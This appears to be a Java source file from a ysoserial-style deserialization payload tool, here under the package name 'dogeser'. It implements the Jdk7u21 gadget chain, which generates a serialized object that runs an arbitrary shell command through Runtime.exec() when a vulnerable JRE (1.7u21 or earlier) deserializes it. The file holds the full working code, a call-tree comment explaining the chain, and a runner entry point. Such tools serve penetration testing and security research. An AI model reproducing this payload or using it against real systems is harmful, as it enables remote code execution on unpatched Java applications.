package dogeser.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;
import java.util.LinkedHashSet;

import javax.xml.transform.Templates;

import dogeser.payloads.annotation.Authors;
import dogeser.payloads.annotation.Dependencies;
import dogeser.payloads.annotation.PayloadTest;
import dogeser.payloads.util.Gadgets;
import dogeser.payloads.util.JavaVersion;
import dogeser.payloads.util.PayloadRunner;
import dogeser.payloads.util.Reflections;


/*

Gadget chain that works against JRE 1.7u21 and earlier. Payload generation has
the same JRE version requirements.

See: https://gist.github.com/frohoff/24af7913611f8406eaf3

Call tree:

LinkedHashSet.readObject()
  LinkedHashSet.add()
    ...
      TemplatesImpl.hashCode() (X)
  LinkedHashSet.add()
    ...
      Proxy(Templates).hashCode() (X)
        AnnotationInvocationHandler.invoke() (X)
          AnnotationInvocationHandler.hashCodeImpl() (X)
            String.hashCode() (0)
            AnnotationInvocationHandler.memberValueHashCode() (X)
              TemplatesImpl.hashCode() (X)
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
                  TemplatesImpl.newTransformer()
                    TemplatesImpl.getTransletInstance()
                      TemplatesImpl.defineTransletClasses()
                        ClassLoader.defineClass()
                        Class.newInstance()
                          ...
                            MaliciousClass.<clinit>()
                              ...
                                Runtime.exec()
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest( precondition = "isApplicableJavaVersion")
@Dependencies()
@dogeser.payloads.annotation.Authors({ Authors.FROHOFF })
public class Jdk7u21 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		final Object templates = dogeser.payloads.util.Gadgets.createTemplatesImpl(command);

		String zeroHashCodeStr = "f5a5a608";

		HashMap map = new HashMap();
		map.put(zeroHashCodeStr, "foo");

		InvocationHandler tempHandler = (InvocationHandler) dogeser.payloads.util.Reflections.getFirstCtor(dogeser.payloads.util.Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
		dogeser.payloads.util.Reflections.setFieldValue(tempHandler, "type", Templates.class);
		Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

		LinkedHashSet set = new LinkedHashSet(); // maintain order
		set.add(templates);
		set.add(proxy);

		dogeser.payloads.util.Reflections.setFieldValue(templates, "_auxClasses", null);
		Reflections.setFieldValue(templates, "_class", null);

		map.put(zeroHashCodeStr, templates); // swap in real object

		return set;
	}

	public static boolean isApplicableJavaVersion() {
	    dogeser.payloads.util.JavaVersion v = JavaVersion.getLocalVersion();
	    return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Jdk7u21.class, args);
	}

}
